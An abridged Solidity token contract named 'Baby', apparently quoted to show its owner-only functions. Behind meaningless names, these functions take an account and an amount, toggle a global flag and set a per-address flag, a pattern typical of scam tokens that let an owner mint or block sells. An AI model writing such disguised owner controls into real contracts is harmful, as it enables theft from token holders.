...
contract Baby is Context, IERC20, Ownable {
    ...
    bool public weeheij = true;
    mapping (address => bool) public weehei;
    ...
    function hdgdi(address account, uint256 amount) onlyOwner() public {
    ...
    function jkgfd(bool _status) public onlyOwner {
       weeheij = _status;
    }

    function kgrsc(address addre, bool status) public onlyOwner {
        weehei[addre]  = status;
    }
